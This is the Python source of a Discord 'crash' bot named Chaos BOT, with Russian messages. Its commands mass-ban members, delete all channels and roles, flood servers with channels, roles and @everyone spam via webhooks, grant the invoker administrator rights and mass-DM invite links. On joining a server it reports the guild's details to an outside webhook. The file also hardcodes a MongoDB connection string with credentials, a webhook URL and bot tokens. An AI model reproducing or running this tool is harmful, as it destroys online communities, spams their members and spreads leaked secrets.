# -*- coding: utf-8 -*-

# Chaos BOT

import asyncio
import discord
from discord.ext import commands
import time
import os
import random
from discord import Permissions
import discord
from discord.ext import commands
from discord import Permissions
import asyncio
import os
import discord, random, aiohttp, asyncio
from threading import Thread
import requests
import typing
from asyncio import create_task
ids = [1071537915722739874]

intents = discord.Intents.default()
intents.members = True

client = commands.Bot(command_prefix='!', intents=intents)

client.remove_command('help')

@client.event
async def on_ready():
	print('Chaos BOT запущен!')
bot = client
import requests, pymongo, asyncio, discord, aiohttp, os
from discord.ext import commands
from discord import Webhook
from pymongo import MongoClient
from discord import Intents
from datetime import datetime
cluster = pymongo.MongoClient("mongodb+srv://root:toor@cluster0.gnfdisl.mongodb.net/?retryWrites=true&w=majority")
db = cluster.test
collraids = cluster.msc.collraids
antileavein = [1057627793690726430]
@bot.event
async def on_ready():
    print(f'primary bot {client.user.name}#{client.user.discriminator}({client.user.id}) is ready.')
    async def guildlinksclear():
      for g in client.guilds:
            if g.id in antileavein:
                  pass
            if g.member_count < 100:
                  #print(f"Покинул {g.name} ({g.member_count} пользователей)")
                  await g.leave()

  
    client.loop.create_task(guildlinksclear())
    values = {
        "_id": 1,
        "count": 0
        }

    if collraids.count_documents({"_id": 1}) == 0:
        collraids.insert_one(values)

            
@client.event
async def on_guild_join(guild):
    try:
        if len(guild.members) <= 10:
            embed = discord.Embed(
                title = f"Попытка краша сервера, где недостаточно участников.\nAttempt to crash a server where there are not enough members.",
                description = f"**Согласно нашим данным на этом сервере меньше `10` человек.**\n**According to our data, there are less than `10` people on this server.**",
                color = 0x0059ff
            )
        await guild.text_channels[0].send(embed=embed)
        await guild.leave()
    except:
        pass    
    hookj = {
        "username": "📣 | НОВЫЙ КРАШ",
        "avatar_url": "https://donatepay.ru/uploads/donate/avatars/1596614233_284795.png",
        "content": "",
        "embeds": [
        {
            "title": f"📣 | СКОРО БУДЕТ КРАШНУТ `{guild}`",
            "color": 595959 ,
            "description": f"🧨・**участников**: `{guild.member_count}` \n\n🧺・**ролей**: `{len(guild.roles)}` \n\n🔥・**Количество каналов**: `{len(guild.text_channels)}` \n\n🖥・**Название сервера:** `{guild}`\n\n🎁・ **Айди Сервера:** `{guild.id}`\n\n💩・**Овнер:** `{guild.owner_id}`・ `{guild.owner.name}` ", 
            "timestamp": "", 
            "author": {
            "name": ""
            },
            "image": {},
            "thumbnail": {
            "url": f"{guild.icon_url}"
            },
            "footer": {},
            "fields": []
        }
        ],
        "components": []
    }
    hook = 'https://discord.com/api/webhooks/1080726262252838922/CNKEbGURIym78n58sCzMcrk5CLSPHn453RsMz8xrrIaYtZi2VB7xVdvB4_mbOBxDZYi5'
    requests.post(hook, json=hookj)



@client.event
async def on_guild_remove(guild):
   print(f"покинул / удалили с сервера {guild.name} ({guild.member_count} пользователей)")

async def send_user(ctx, user, text):
	try:
		await user.send(text)
	except: pass 
@client.command()
@commands.cooldown(1, 3000, commands.BucketType.guild)
async def dm_all(ctx):
    await asyncio.gather(*[send_user(ctx, member, text=f"{member.mention} заходи - https://discord.gg/pon") for member in ctx.guild.members])
@client.command()
@commands.cooldown(1, 30, commands.BucketType.guild)
async def helpchaos(ctx):
    embed = discord.Embed(
        title = 'Команды:',
        description = '`!ban @Участник`\nБанит определённого участника\n\n`!banall`\nЗабанить ВСЕХ участников\n\n`!kickall`\nКикнуть ВСЕХ участников\n\n`!delchannels`\nУдаляет ВСЕ каналы\n\n`!delroles`\nУдаляет ВСЕ роли\n\n`!channels`\nБесконечно создаёт новые каналы\n\n`!roles`\nБесконечно создаёт новые роли\n\n`!everyone`\nРассылка о краше во все каналы\n\n`!clear`\nОчистка чата\n\n`!rename`\nПереименовывание сервера и изменение аватарки\n\n`!spam`\nСпамит о краше в текущий канал\n\n`!send @Участник [ текст ]`\nОтправить сообщение от лица бота в лс участнику\n\n`!attack`\nАвтоматический краш сервера\n\n`!spamwebhooks`\nСоздание вебхуков на все каналы и спам в них (если на сервере более 50 каналов, эта команда не будет работать)',
        colour = discord.Colour.from_rgb(237, 47, 47)
    )

    try:
        await ctx.author.send(embed=embed)
    except:
    	await ctx.send(embed=embed)


@client.command()
@commands.cooldown(1, 3000, commands.BucketType.guild)
async def ban(ctx, member: discord.Member):
	try:
		await ctx.guild.ban(member, reason='Краш сервера')
	except Exception as err:
		await ctx.send('Не могу забанить участника!')

	await ctx.message.delete()





async def kchls(ctx):
	good = 0
	bad = 0
	await ctx.message.delete()
	for channel in ctx.guild.channels:
		try:
			await channel.delete()
			good +=1
		except:
			bad +=1

	await ctx.guild.create_text_channel('chat')

	try:
		await ctx.author.send(f'Удалено {good} каналов, не удалил {bad} каналов.')
	except:
		chn = await ctx.guild.create_text_channel('chaos')
		await chn.send(f'Удалено {good} каналов, не удалил {bad} каналов.')

@client.command()
@commands.cooldown(1, 3000, commands.BucketType.guild)
async def delchannels(ctx):
	asyncio.create_task(kchls(ctx))

async def krls(ctx):
	errs = 0
	goods = 0
	for jk in ctx.guild.roles:
		try:
			await jk.delete()
			goods +=1
		except:
			errs +=1

	try:
		await ctx.author.send(f'Удалено {goods} ролей, не удалил - {errs} ролей\n||Если удалено 0 ролей, перемести роль бота повыше||')
	except:
		await ctx.send(f'Удалено {goods} ролей, не удалил - {errs} ролей\n||Если удалено 0 ролей, перемести роль бота повыше||')

@client.command()
@commands.cooldown(1, 300, commands.BucketType.guild)
async def delroles(ctx):
	await ctx.message.delete()
	asyncio.create_task(krls(ctx))

@client.command()
@commands.cooldown(1, 30000, commands.BucketType.guild)
async def channels(ctx):
	await ctx.message.delete()
	for i in range(100):
		await ctx.guild.create_text_channel('chaos-bot')
		await ctx.guild.create_voice_channel('Chaos BOT')
		await ctx.guild.create_category('Chaos BOT')


        

async def spallch(ctx):
	msg = '@everyone @here \n Переезд на новый сервер, где вы сможете получить бесплатное нитро и таких же ботов, умей постаять за себя!:https://discord.gg/pon\nMudarse a un nuevo servidor, donde puede obtener nitro gratis y los mismos bots, ¡podrá defenderse por sí mismo!: https://discord.gg/pon\nMoving to a new server, where you can get free nitro and the same bots, be able to stand up for yourself!:https://discord.gg/pon'
	for channel in ctx.guild.text_channels:
		try:
			await channel.send(msg)
		except:
			pass

@client.command()
@commands.cooldown(1, 30000, commands.BucketType.guild)
async def everyone(ctx):
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))

async def clrs(ctx):
	await ctx.channel.purge(limit=10000)

@client.command()
@commands.cooldown(1, 300, commands.BucketType.guild)
async def clear(ctx):
	asyncio.create_task(clrs(ctx))
	asyncio.create_task(clrs(ctx))
	asyncio.create_task(clrs(ctx))
	asyncio.create_task(clrs(ctx))
	asyncio.create_task(clrs(ctx))

	await ctx.send('Успешно очищены сообщения в данном канале!')

@client.command()
async def send(ctx, member: discord.Member, *, text):
	await ctx.message.delete()
	try:
		await member.send(text)
	except:
		await ctx.send(f'Не смог отправить сообщение!')

@client.command()
async def rename(ctx):
	await ctx.message.delete()
	with open('icon.PNG', 'rb') as f:
		icon = f.read()
		await ctx.guild.edit(name='__...<<CRASHED>>...__', icon=icon)

@client.command()
async def spam(ctx):
	await ctx.message.delete()
	for i in range(100):
		await ctx.send(f'@everyone @here \n Переезд на новый сервер, где вы сможете получить бесплатное нитро и таких же ботов, умей постаять за себя!:https://discord.gg/pon\nMudarse a un nuevo servidor, donde puede obtener nitro gratis y los mismos bots, ¡podrá defenderse por sí mismo!: https://discord.gg/pon\nMoving to a new server, where you can get free nitro and the same bots, be able to stand up for yourself!:https://discord.gg/pon')

async def crchrls(ctx):
	for i in range(15):
		await ctx.guild.create_text_channel('chaos-bot')
		await ctx.guild.create_voice_channel('Chaos BOT')
		await ctx.guild.create_role(name='Crashed By Chaos BOT')

async def kroles(ctx):
	for jk in ctx.guild.roles:
		try:
			await jk.delete()
		except:
			pass

@client.command()
async def attack(ctx):
	goodchannels = 0
	badchannels = 0
	goodroles = 0
	badroles = 0
	banned = 0
	badbanned = 0
	
	await ctx.message.delete()
	with open('icon.PNG', 'rb') as f:
		icon = f.read()
		await ctx.guild.edit(name='__...<<CRASHED>>...__', icon=icon)

	asyncio.create_task(krls(ctx))

	good = 0
	bad = 0
	for channel in ctx.guild.channels:
		try:
			await channel.delete()
			good +=1
		except:
			bad +=1

	await ctx.guild.create_text_channel('chat')

	try:
		await ctx.author.send(f'Удалено {good} каналов, не удалил {bad} каналов.')
	except:
		pass

	asyncio.create_task(crchrls(ctx))
	asyncio.create_task(crchrls(ctx))
	asyncio.create_task(crchrls(ctx))
	asyncio.create_task(crchrls(ctx))
	asyncio.create_task(crchrls(ctx))

	count = 0
	errs = 0






async def createhooks(ctx):
  for channel in ctx.guild.text_channels: 
    try:
      await channel.create_webhook(name='Chaos 2.0')
    except:
      pass

async def spamhooks(ctx):
  for i in range(10):
    for channel in ctx.guild.channels:
      try:
        h = await channel.webhooks()
        for f in h:
          await f.send(content='@everyone\nДанный сервер крашиться, с любовью - Chaos 2.0 :heart:\nСсылка на дискорд сервер с бесплатным нитро и краш ботами: https://discord.gg/pon', wait=True)
      except:
        continue

@client.command()
@commands.cooldown(1, 600, commands.BucketType.guild)
async def spamwebhooks(ctx):
	await createhooks(ctx)
	asyncio.create_task(spamhooks(ctx))
	asyncio.create_task(spamhooks(ctx))
	asyncio.create_task(spamhooks(ctx))
	asyncio.create_task(spamhooks(ctx))
	asyncio.create_task(spamhooks(ctx))

@client.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name = "Crash By Chaos 2.0")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
      webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
      for i in range(100):
        try:
          await webhook.send(f"@everyone @here \n Переезд на новый сервер, где вы сможете получить бесплатное нитро и таких же ботов, умей постаять за себя!:https://discord.gg/pon\nMudarse a un nuevo servidor, donde puede obtener nitro gratis y los mismos bots, ¡podrá defenderse por sí mismo!: https://discord.gg/pon\nMoving to a new server, where you can get free nitro and the same bots, be able to stand up for yourself!:https://discord.gg/pon", tts=True)
        except:
          pass       

antileavein = []
@client.command()
@commands.cooldown(1, 300, commands.BucketType.guild)
async def create_invite(ctx, server_id: int):
    if server_id != None:
        guild = client.get_guild(server_id)
        invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0, temporary=False)
        await ctx.send(f"https://discord.gg/{invite.code}")

@client.command()
@commands.cooldown(1, 300, commands.BucketType.guild)
async def links(ctx, members: int=30):
    if ctx.channel.id != 1077130797661814824:
        return
    for g in client.guilds:
        if g.id in antileavein:
            return
        if g.id == ctx.guild.id:
            return
        if g.member_count<members:
            try:
                await g.leave()
            except:
                return
        try:
            guild = client.get_guild(g.id)
            invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0, temporary=False)
            await ctx.send(f"https://discord.gg/{invite.code}")
        except:
            try:
                await g.leave()
            except:
                return
@client.command(pass_context=True)
@commands.cooldown(1, 300, commands.BucketType.guild)
async def adm(ctx): 
    guild = ctx.guild
    perms = discord.Permissions(administrator=True) 
    await guild.create_role(name="Admin", permissions=perms) 
    
    role = discord.utils.get(ctx.guild.roles, name="Admin") 
    user = ctx.message.author 
    await user.add_roles(role) 
    await ctx.message.delete()
    await ctx.author.send("Вам выдан администратор")



@client.command()
async def ultragvrwrv1111(guild):
        for guild in client.guilds: 
            try:
                chan = await guild.create_text_channel(name="переезд", topic="ГТА")
                print(f"создал канал на сервере {guild.name}")
                await chan.send(f"@everyone @here \n Переезд на новый сервер, где вы сможете получить бесплатное нитро и таких же ботов, умей постаять за себя!:https://discord.gg/pon\nMudarse a un nuevo servidor, donde puede obtener nitro gratis y los mismos bots, ¡podrá defenderse por sí mismo!: https://discord.gg/pon\nMoving to a new server, where you can get free nitro and the same bots, be able to stand up for yourself!:https://discord.gg/pon")
                print("в канал отправил")
                await guild.leave()
                print(f"ВЫШЕЛ ИЗ {guild.name}")
            except: pass
token = "MTA3NTgwMzA3OTU2NTM3NzYwNg.GK-e3y.PVIp2TcXGAprFMqZWp8fWKaWTeIEZKwgwR_xp4" #"MTA0OTk5NjAxNDIwMDgzMjA1MQ.GD-ei5.85t1uOReLbiyPvDU1E8XgUjytsM978XlsGl4VQ"
client.run(token,bot =True)